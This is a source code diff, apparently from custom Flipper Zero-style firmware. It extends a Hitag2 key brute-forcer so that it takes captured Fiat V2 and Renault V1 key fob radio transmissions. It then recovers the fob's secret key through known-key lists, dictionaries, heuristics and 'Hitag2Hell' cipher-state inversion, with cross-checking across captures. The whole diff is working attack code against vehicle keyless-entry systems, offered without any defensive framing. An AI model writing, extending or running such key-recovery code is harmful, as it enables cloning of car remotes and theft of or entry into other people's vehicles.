@@ -13,6 +13,8 @@
 #include "subghz_hitag2_hell.h"
 
 #include <lib/subghz/protocols/fiat_v1.h>
+#include <lib/subghz/protocols/fiat_v2.h>
+#include <lib/subghz/protocols/renault_v1.h>
 #include <storage/storage.h>
 #include <furi_hal.h>
 
@@ -94,11 +96,102 @@ bool subghz_hitag2_bf_add_capture(
     }
 
     SubGhzHitag2BfCapture* cap = &instance->captures[instance->capture_count++];
+    memset(cap, 0, sizeof(*cap));
     cap->uid = uid;
     cap->control = control;
     cap->button = button;
     cap->hop = hop;
+    cap->is_fiat_v2 = false;
+    cap->iv_combo = 0;
     return true;
+}
+
+bool subghz_hitag2_bf_add_capture_v2(
+    SubGhzHitag2Bf* instance,
+    uint32_t uid,
+    uint32_t hop,
+    const uint8_t raw[14]) {
+    furi_check(instance);
+    furi_check(raw);
+
+    if(instance->capture_count >= SUBGHZ_HITAG2_BF_MAX_CAPTURES) {
+        return false;
+    }
+    // All captures MUST share the same UID
+    if(instance->capture_count > 0 && instance->captures[0].uid != uid) {
+        FURI_LOG_W(TAG, "Rejecting capture with different UID");
+        return false;
+    }
+    // Combo-0 placeholder IV values (real combo resolved during verify/invert).
+    uint8_t button = subghz_protocol_fiat_v2_iv_button_for_combo(raw, 0);
+    uint16_t control = subghz_protocol_fiat_v2_iv_control_for_combo(raw, 0);
+
+    // Reject duplicate frames (identical raw + hop already stored)
+    for(uint8_t i = 0; i < instance->capture_count; i++) {
+        if(instance->captures[i].is_fiat_v2 && instance->captures[i].hop == hop &&
+           memcmp(instance->captures[i].raw, raw, 14) == 0) {
+            return false;
+        }
+    }
+
+    SubGhzHitag2BfCapture* cap = &instance->captures[instance->capture_count++];
+    memset(cap, 0, sizeof(*cap));
+    cap->uid = uid;
+    cap->control = control;
+    cap->button = button;
+    cap->hop = hop;
+    cap->is_fiat_v2 = true;
+    cap->iv_combo = 0;
+    memcpy(cap->raw, raw, 14);
+    return true;
+}
+
+bool subghz_hitag2_bf_add_capture_renault_v1(
+    SubGhzHitag2Bf* instance,
+    uint32_t uid,
+    uint64_t payload42,
+    uint8_t button,
+    uint8_t counter) {
+    furi_check(instance);
+
+    if(instance->capture_count >= SUBGHZ_HITAG2_BF_MAX_CAPTURES) {
+        return false;
+    }
+    // All captures MUST share the same UID
+    if(instance->capture_count > 0 && instance->captures[0].uid != uid) {
+        FURI_LOG_W(TAG, "Rejecting capture with different UID");
+        return false;
+    }
+    // Reject duplicates (same uid + payload42)
+    for(uint8_t i = 0; i < instance->capture_count; i++) {
+        if(instance->captures[i].is_renault_v1 && instance->captures[i].uid == uid &&
+           instance->captures[i].payload42 == payload42) {
+            return false;
+        }
+    }
+
+    SubGhzHitag2BfCapture* cap = &instance->captures[instance->capture_count++];
+    memset(cap, 0, sizeof(*cap));
+    cap->uid = uid;
+    cap->is_renault_v1 = true;
+    cap->payload42 = payload42;
+    cap->rv1_button = button;
+    cap->rv1_counter = counter;
+    cap->hop_slice = 0;
+    cap->iv_combo = 0;
+    return true;
+}
+
+uint8_t subghz_hitag2_bf_get_capture_iv_combo(const SubGhzHitag2Bf* instance, uint8_t index) {
+    furi_check(instance);
+    if(index >= instance->capture_count) return 0;
+    return instance->captures[index].iv_combo;
+}
+
+uint8_t subghz_hitag2_bf_get_capture_hop_slice(const SubGhzHitag2Bf* instance, uint8_t index) {
+    furi_check(instance);
+    if(index >= instance->capture_count) return 0;
+    return instance->captures[index].hop_slice;
 }
 
 uint8_t subghz_hitag2_bf_get_capture_count(const SubGhzHitag2Bf* instance) {
@@ -128,6 +221,44 @@ bool subghz_hitag2_bf_get_capture(
     return true;
 }
 
+bool subghz_hitag2_bf_get_capture_is_fiat_v2(const SubGhzHitag2Bf* instance, uint8_t index) {
+    furi_check(instance);
+    if(index >= instance->capture_count) return false;
+    return instance->captures[index].is_fiat_v2;
+}
+
+bool subghz_hitag2_bf_get_capture_is_renault_v1(const SubGhzHitag2Bf* instance, uint8_t index) {
+    furi_check(instance);
+    if(index >= instance->capture_count) return false;
+    return instance->captures[index].is_renault_v1;
+}
+
+bool subghz_hitag2_bf_get_capture_raw(
+    const SubGhzHitag2Bf* instance,
+    uint8_t index,
+    uint8_t raw_out[14]) {
+    furi_check(instance);
+    furi_check(raw_out);
+    if(index >= instance->capture_count) return false;
+    memcpy(raw_out, instance->captures[index].raw, 14);
+    return true;
+}
+
+bool subghz_hitag2_bf_get_capture_rv1(
+    const SubGhzHitag2Bf* instance,
+    uint8_t index,
+    uint64_t* payload42_out,
+    uint8_t* button_out,
+    uint8_t* counter_out) {
+    furi_check(instance);
+    if(index >= instance->capture_count) return false;
+    const SubGhzHitag2BfCapture* cap = &instance->captures[index];
+    if(payload42_out) *payload42_out = cap->payload42;
+    if(button_out) *button_out = cap->rv1_button;
+    if(counter_out) *counter_out = cap->rv1_counter;
+    return true;
+}
+
 void subghz_hitag2_bf_set_levels(SubGhzHitag2Bf* instance, uint8_t levels_mask) {
     furi_check(instance);
     instance->levels_mask = levels_mask;
@@ -151,18 +282,166 @@ uint64_t subghz_hitag2_bf_get_total_keys_tested(const SubGhzHitag2Bf* instance) 
     return instance->keys_tested_total;
 }
 
+// Verify a single V1 capture with its stored (button, control).
+static bool subghz_hitag2_bf_verify_cap_v1(
+    const SubGhzHitag2BfCapture* cap,
+    const uint8_t key[6],
+    uint32_t epoch) {
+    return subghz_protocol_fiat_v1_verify_key(
+        cap->uid, cap->button, cap->control, cap->hop, key, epoch);
+}
+
+// Verify a single V2 capture using a specific IV combo.
+static bool subghz_hitag2_bf_verify_cap_v2_combo(
+    const SubGhzHitag2BfCapture* cap,
+    const uint8_t key[6],
+    uint32_t epoch,
+    uint8_t combo) {
+    uint8_t button_c = subghz_protocol_fiat_v2_iv_button_for_combo(cap->raw, combo);
+    uint16_t control_c = subghz_protocol_fiat_v2_iv_control_for_combo(cap->raw, combo);
+    return subghz_protocol_fiat_v1_verify_key(
+        cap->uid, button_c, control_c, cap->hop, key, epoch);
+}
+
+// Verify a single Renault V1 capture with a specific (slice, combo). Renault V1
+// reuses the Fiat V1 cipher: uid direct, IV = (iv_button, iv_control) for combo,
+// hop = candidate_hop(payload42, slice).
+static bool subghz_hitag2_bf_verify_cap_rv1_slice_combo(
+    const SubGhzHitag2BfCapture* cap,
+    const uint8_t key[6],
+    uint32_t epoch,
+    uint8_t slice,
+    uint8_t combo) {
+    uint8_t iv_btn = subghz_protocol_renault_v1_iv_button(cap->rv1_button, combo);
+    uint16_t iv_ctrl = subghz_protocol_renault_v1_iv_control(cap->rv1_counter, combo);
+    uint32_t hop = subghz_protocol_renault_v1_candidate_hop(cap->payload42, slice);
+    return subghz_protocol_fiat_v1_verify_key(cap->uid, iv_btn, iv_ctrl, hop, key, epoch);
+}
+
+// Core cross-validation used by both the const public verify and the resolver.
+// Returns true if `key` validates ALL captures.
+//   - Fiat V1 captures: must pass with their own stored IV.
+//   - Fiat V2 captures: a SINGLE IV combo (0..3) must validate every V2 capture
+//     simultaneously (the fob uses one fixed IV convention); when found,
+//     *combo_out receives it.
+//   - Renault V1 captures: a SINGLE (slice, combo) pair from
+//     [0..HOP_SLICE_COUNT) x [0..IV_COMBO_COUNT) must validate every Renault V1
+//     capture simultaneously; when found, *slice_out/*combo_out receive it.
+// If a mix of protocols is present, each protocol's own constraint must hold.
+static bool subghz_hitag2_bf_verify_multi_impl(
+    const SubGhzHitag2Bf* instance,
+    const uint8_t key[6],
+    uint32_t epoch,
+    uint8_t* combo_out,
+    uint8_t* slice_out) {
+    // First, all V1 captures must pass unconditionally.
+    for(uint8_t i = 0; i < instance->capture_count; i++) {
+        const SubGhzHitag2BfCapture* cap = &instance->captures[i];
+        if(cap->is_fiat_v2 || cap->is_renault_v1) continue;
+        if(!subghz_hitag2_bf_verify_cap_v1(cap, key, epoch)) {
+            return false;
+        }
+    }
+
+    // Count V2 and Renault V1 captures.
+    bool any_v2 = false;
+    bool any_rv1 = false;
+    for(uint8_t i = 0; i < instance->capture_count; i++) {
+        if(instance->captures[i].is_fiat_v2) any_v2 = true;
+        if(instance->captures[i].is_renault_v1) any_rv1 = true;
+    }
+
+    // Fiat V2: find a single combo that validates EVERY V2 capture.
+    if(any_v2) {
+        bool v2_ok = false;
+        for(uint8_t combo = 0; combo < FIAT_V2_IV_COMBO_COUNT; combo++) {
+            bool all_ok = true;
+            for(uint8_t i = 0; i < instance->capture_count; i++) {
+                const SubGhzHitag2BfCapture* cap = &instance->captures[i];
+                if(!cap->is_fiat_v2) continue;
+                if(!subghz_hitag2_bf_verify_cap_v2_combo(cap, key, epoch, combo)) {
+                    all_ok = false;
+                    break;
+                }
+            }
+            if(all_ok) {
+                if(combo_out) *combo_out = combo;
+                v2_ok = true;
+                break;
+            }
+        }
+        if(!v2_ok) return false;
+    } else if(combo_out) {
+        *combo_out = 0;
+    }
+
+    // Renault V1: find a single (slice, combo) that validates EVERY RV1 capture.
+    if(any_rv1) {
+        bool rv1_ok = false;
+        for(uint8_t slice = 0; slice < RENAULT_V1_HOP_SLICE_COUNT && !rv1_ok; slice++) {
+            for(uint8_t combo = 0; combo < RENAULT_V1_IV_COMBO_COUNT; combo++) {
+                bool all_ok = true;
+                for(uint8_t i = 0; i < instance->capture_count; i++) {
+                    const SubGhzHitag2BfCapture* cap = &instance->captures[i];
+                    if(!cap->is_renault_v1) continue;
+                    if(!subghz_hitag2_bf_verify_cap_rv1_slice_combo(
+                           cap, key, epoch, slice, combo)) {
+                        all_ok = false;
+                        break;
+                    }
+                }
+                if(all_ok) {
+                    if(slice_out) *slice_out = slice;
+                    if(combo_out) *combo_out = combo;
+                    rv1_ok = true;
+                    break;
+                }
+            }
+        }
+        if(!rv1_ok) return false;
+    } else if(slice_out) {
+        *slice_out = 0;
+    }
+
+    return true;
+}
+
 bool subghz_hitag2_bf_verify_multi(
     const SubGhzHitag2Bf* instance,
     const uint8_t key[6],
     uint32_t epoch) {
+    return subghz_hitag2_bf_verify_multi_impl(instance, key, epoch, NULL, NULL);
+}
+
+// Like verify_multi but records the winning IV combo (V2 and RV1) and hop slice
+// (RV1) into every matching capture so the scene can persist it. Non-const
+// because it mutates capture state.
+static bool subghz_hitag2_bf_verify_multi_resolve(
+    SubGhzHitag2Bf* instance,
+    const uint8_t key[6],
+    uint32_t epoch) {
+    uint8_t combo = 0;
+    uint8_t slice = 0;
+    if(!subghz_hitag2_bf_verify_multi_impl(instance, key, epoch, &combo, &slice)) {
+        return false;
+    }
     for(uint8_t i = 0; i < instance->capture_count; i++) {
-        const SubGhzHitag2BfCapture* cap = &instance->captures[i];
-        if(!subghz_protocol_fiat_v1_verify_key(
-               cap->uid, cap->button, cap->control, cap->hop, key, epoch)) {
-            return false;
+        if(instance->captures[i].is_fiat_v2) {
+            instance->captures[i].iv_combo = combo;
+        } else if(instance->captures[i].is_renault_v1) {
+            instance->captures[i].iv_combo = combo;
+            instance->captures[i].hop_slice = slice;
         }
     }
     return true;
+}
+
+bool subghz_hitag2_bf_verify_multi_resolve_key(
+    SubGhzHitag2Bf* instance,
+    const uint8_t key[6],
+    uint32_t epoch) {
+    furi_check(instance);
+    return subghz_hitag2_bf_verify_multi_resolve(instance, key, epoch);
 }
 
 // -----------------------------------------------------------------------------
@@ -177,7 +456,7 @@ static bool subghz_hitag2_bf_run_l1(
     const uint8_t(*known_keys)[6] = subghz_protocol_fiat_v1_get_known_keys();
     for(uint8_t i = 0; i < FIAT_V1_KNOWN_KEY_COUNT; i++) {
         if(instance->cancel) return false;
-        if(subghz_hitag2_bf_verify_multi(instance, known_keys[i], 0)) {
+        if(subghz_hitag2_bf_verify_multi_resolve(instance, known_keys[i], 0)) {
             memcpy(instance->found_key, known_keys[i], 6);
             instance->found_epoch = 0;
             instance->found_level = SubGhzHitag2BfLevelKnown;
@@ -217,7 +496,7 @@ static bool subghz_hitag2_bf_run_l2(
         if(instance->cancel) return false;
         const uint8_t(*key)[6] = subghz_hitag2_bf_flash_dict_get(i);
         if(!key) break;
-        if(subghz_hitag2_bf_verify_multi(instance, *key, 0)) {
+        if(subghz_hitag2_bf_verify_multi_resolve(instance, *key, 0)) {
             memcpy(instance->found_key, *key, 6);
             instance->found_epoch = 0;
             instance->found_level = SubGhzHitag2BfLevelFlashDict;
@@ -349,7 +628,7 @@ static bool subghz_hitag2_bf_run_l3(
             if(line_pos > 0) {
                 line_buf[line_pos] = '\0';
                 if(parse_hex_key(line_buf, key)) {
-                    if(subghz_hitag2_bf_verify_multi(instance, key, 0)) {
+                    if(subghz_hitag2_bf_verify_multi_resolve(instance, key, 0)) {
                         memcpy(instance->found_key, key, 6);
                         instance->found_epoch = 0;
                         instance->found_level = SubGhzHitag2BfLevelSDDict;
@@ -366,7 +645,7 @@ static bool subghz_hitag2_bf_run_l3(
             if(line_pos > 0) {
                 line_buf[line_pos] = '\0';
                 if(parse_hex_key(line_buf, key)) {
-                    if(subghz_hitag2_bf_verify_multi(instance, key, 0)) {
+                    if(subghz_hitag2_bf_verify_multi_resolve(instance, key, 0)) {
                         memcpy(instance->found_key, key, 6);
                         instance->found_epoch = 0;
                         instance->found_level = SubGhzHitag2BfLevelSDDict;
@@ -461,7 +740,7 @@ static bool subghz_hitag2_bf_run_l4(
             key[3] = (uint8_t)patched;
             key[4] = tails[ti][0];
             key[5] = tails[ti][1];
-            if(subghz_hitag2_bf_verify_multi(instance, key, 0)) {
+            if(subghz_hitag2_bf_verify_multi_resolve(instance, key, 0)) {
                 memcpy(instance->found_key, key, 6);
                 instance->found_epoch = 0;
                 instance->found_level = SubGhzHitag2BfLevelHeuristic;
@@ -496,7 +775,7 @@ static bool subghz_hitag2_bf_run_l4(
             if(instance->cancel) return false;
             memcpy(key, known_keys[k], 6);
             key[5] = (uint8_t)(key[5] + delta);
-            if(subghz_hitag2_bf_verify_multi(instance, key, 0)) {
+            if(subghz_hitag2_bf_verify_multi_resolve(instance, key, 0)) {
                 memcpy(instance->found_key, key, 6);
                 instance->found_epoch = 0;
                 instance->found_level = SubGhzHitag2BfLevelHeuristic;
@@ -512,7 +791,7 @@ static bool subghz_hitag2_bf_run_l4(
     for(uint8_t k = 0; k < FIAT_V1_KNOWN_KEY_COUNT; k++) {
         for(uint32_t epoch = 1; epoch <= 7; epoch++) {
             if(instance->cancel) return false;
-            if(subghz_hitag2_bf_verify_multi(instance, known_keys[k], epoch)) {
+            if(subghz_hitag2_bf_verify_multi_resolve(instance, known_keys[k], epoch)) {
                 memcpy(instance->found_key, known_keys[k], 6);
                 instance->found_epoch = epoch;
                 instance->found_level = SubGhzHitag2BfLevelHeuristic;
@@ -652,30 +931,115 @@ static bool subghz_hitag2_bf_try_hell_on_capture(
             cfg.l0_end = SUBGHZ_HITAG2_BF_L5_TOTAL_SLOTS;
         }
 
+        if(cap->is_renault_v1) {
+            // [HITAG2_BF] Renault V1: the 32-bit hop feeding the Hitag2Hell
+            // recovery depends on BOTH the hop bit-slice AND (for inversion) the
+            // IV combo. state31 is recovered from the hop, which depends on the
+            // slice, so hitag2_hell_recover() must run PER SLICE (each slice is a
+            // different hop -> different state31 candidate set). Inside each
+            // slice's candidates we then invert once per IV combo and let the
+            // multi-capture verifier (which itself searches all slice/combo pairs
+            // across all captures) confirm the winner. 3 slices x 4 combos = 12
+            // iterations per candidate — acceptable versus the L0 sweep cost.
+            for(uint8_t slice = 0; slice < RENAULT_V1_HOP_SLICE_COUNT; slice++) {
+                if(instance->cancel) return false;
+                uint32_t hop = subghz_protocol_renault_v1_candidate_hop(cap->payload42, slice);
+
+                Hitag2HellResult result;
+                memset(&result, 0, sizeof(result));
+                if(hitag2_hell_recover(hop, &cfg, &result)) {
+                    for(uint32_t i = 0; i < result.candidate_count; i++) {
+                        if(instance->cancel) return false;
+                        uint8_t key[6];
+                        bool found_here = false;
+                        for(uint8_t combo = 0; combo < RENAULT_V1_IV_COMBO_COUNT; combo++) {
+                            uint8_t btn_c =
+                                subghz_protocol_renault_v1_iv_button(cap->rv1_button, combo);
+                            uint16_t ctrl_c =
+                                subghz_protocol_renault_v1_iv_control(cap->rv1_counter, combo);
+                            if(!hitag2_fiat_invert_init(
+                                   result.candidates[i], cap->uid, btn_c, ctrl_c, 0, key)) {
+                                continue;
+                            }
+                            // Multi-capture cross-validation. The resolver
+                            // requires a SINGLE (slice, combo) to validate all
+                            // Renault V1 captures.
+                            if(subghz_hitag2_bf_verify_multi_resolve(instance, key, 0)) {
+                                memcpy(instance->found_key, key, 6);
+                                instance->found_epoch = 0;
+                                instance->found_level = SubGhzHitag2BfLevelHitag2Hell;
+                                instance->found = true;
+                                found_here = true;
+                                break;
+                            }
+                        }
+                        if(found_here) return true;
+                    }
+                }
+                if(result.cancelled) {
+                    instance->cancel = true;
+                    return false;
+                }
+            }
+            continue;
+        }
+
         Hitag2HellResult result;
         memset(&result, 0, sizeof(result));
 
         if(hitag2_hell_recover(cap->hop, &cfg, &result)) {
             // Try each candidate: invert to key, verify against all captures.
+            // The state31 recovered from `hop` is IV-independent, but the
+            // init-phase inversion that turns state31 into the 6-byte key DOES
+            // depend on the IV (button, control). For Fiat V1 the IV is known;
+            // for Fiat V2 it is one of 4 combos, so we invert once per combo and
+            // let the multi-capture verifier confirm the winner.
             for(uint32_t i = 0; i < result.candidate_count; i++) {
                 if(instance->cancel) return false;
                 uint8_t key[6];
-                if(!hitag2_fiat_invert_init(
-                       result.candidates[i],
-                       cap->uid,
-                       cap->button,
-                       cap->control,
-                       0, // epoch = 0 (Fiat V1 default)
-                       key)) {
-                    continue;
-                }
-                // Multi-capture cross-validation
-                if(subghz_hitag2_bf_verify_multi(instance, key, 0)) {
-                    memcpy(instance->found_key, key, 6);
-                    instance->found_epoch = 0;
-                    instance->found_level = SubGhzHitag2BfLevelHitag2Hell;
-                    instance->found = true;
-                    return true;
+
+                if(cap->is_fiat_v2) {
+                    bool found_here = false;
+                    for(uint8_t combo = 0; combo < FIAT_V2_IV_COMBO_COUNT; combo++) {
+                        uint8_t btn_c =
+                            subghz_protocol_fiat_v2_iv_button_for_combo(cap->raw, combo);
+                        uint16_t ctrl_c =
+                            subghz_protocol_fiat_v2_iv_control_for_combo(cap->raw, combo);
+                        if(!hitag2_fiat_invert_init(
+                               result.candidates[i], cap->uid, btn_c, ctrl_c, 0, key)) {
+                            continue;
+                        }
+                        // Multi-capture cross-validation. The resolver requires a
+                        // SINGLE combo to validate all V2 captures; the combo that
+                        // produced this key must be that same winning combo.
+                        if(subghz_hitag2_bf_verify_multi_resolve(instance, key, 0)) {
+                            memcpy(instance->found_key, key, 6);
+                            instance->found_epoch = 0;
+                            instance->found_level = SubGhzHitag2BfLevelHitag2Hell;
+                            instance->found = true;
+                            found_here = true;
+                            break;
+                        }
+                    }
+                    if(found_here) return true;
+                } else {
+                    if(!hitag2_fiat_invert_init(
+                           result.candidates[i],
+                           cap->uid,
+                           cap->button,
+                           cap->control,
+                           0, // epoch = 0 (Fiat V1 default)
+                           key)) {
+                        continue;
+                    }
+                    // Multi-capture cross-validation
+                    if(subghz_hitag2_bf_verify_multi_resolve(instance, key, 0)) {
+                        memcpy(instance->found_key, key, 6);
+                        instance->found_epoch = 0;
+                        instance->found_level = SubGhzHitag2BfLevelHitag2Hell;
+                        instance->found = true;
+                        return true;
+                    }
                 }
             }
         }
